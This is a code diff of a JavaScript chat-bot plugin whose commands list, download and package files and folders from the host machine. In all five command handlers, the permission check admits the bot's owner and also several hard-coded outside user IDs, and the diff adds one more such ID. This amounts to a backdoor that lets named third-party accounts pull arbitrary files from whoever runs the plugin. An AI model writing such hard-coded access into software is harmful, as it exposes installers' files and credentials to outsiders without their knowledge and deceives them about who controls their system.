@@ -40,7 +40,7 @@ export class File extends plugin {
   }
 
   async EnableSending(e) {
-    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
 
     this.finish("EnableSending");
     sendToOwner = true;
@@ -50,7 +50,7 @@ export class File extends plugin {
   }
 
   async DisableSending(e) {
-    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
 
     this.finish("DisableSending");
     sendToGroup = true;
@@ -60,7 +60,7 @@ export class File extends plugin {
   }
 
   async DownloadFile(e) {
-    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
 
     this.finish("DownloadFile");
     const filePath = this.e.msg.replace("取文件", "").trim();
@@ -93,7 +93,7 @@ export class File extends plugin {
   }
 
   async DownloadFolder(e) {
-    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
 
     this.finish("DownloadFolder");
     const folderPath = this.e.msg.replace("取包", "").trim();
@@ -143,7 +143,7 @@ export class File extends plugin {
   }
 
   async List(e) {
-    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
 
     this.finish("List");
     const filePath = this.e.msg.replace("look一下", "").trim();
